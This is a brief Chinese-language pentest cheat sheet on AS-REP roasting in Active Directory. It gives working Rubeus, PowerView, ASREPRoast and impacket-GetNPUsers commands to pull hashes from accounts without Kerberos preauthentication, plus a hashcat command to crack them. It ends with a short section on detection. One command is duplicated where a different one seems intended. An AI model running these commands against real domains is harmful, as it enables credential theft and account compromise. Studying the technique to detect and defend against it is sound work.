AS-REP roasting就是获取设置了Do not require Kerberos preauthentication用户的哈希


Windows

Rubeus

项目地址：https://github.com/GhostPack/Rubeus

Rubeus.exe asreproast

在$krb5asrep后面添加$23拼接。

使用hashcat破解密码

hashcat -m 18200 -a 0 hash /usr/share/wordlists/rockyou.txt --force

powershell

利用Powerview查找域中可以被AS-REP Roasting的用户

Import-Module .\powerview.ps1Get-DomainUser -PreauthNotRequired


利用ASREPRoast.ps1获取哈希

项目地址：https://github.com/HarmJ0y/ASREPRoast/blob/master/ASREPRoast.ps1

Import-Module .\powerview.ps1Get-DomainUser -PreauthNotRequired
Linux

利用条件

  • 机器可以和KDC通讯

  • 获取到没有开启预验证的账户名

impacket-GetNPUsers -request -dc-ip 192.168.146.129 ms.ro/cat  -format hashcat -outputfile hashes.asreproast -no-pass



检测

基于文件

常规思路是检测Rubeus.exe，powershell脚本等，不过要注意.net assembly等无文件技术的检测也需要跟上。

基于行为

  1. 大量Do not require Kerberos preauthentication用户的请求

  2. 基于UEBA做异常登录行为检测，甚至可以设置一些蜜饵用户
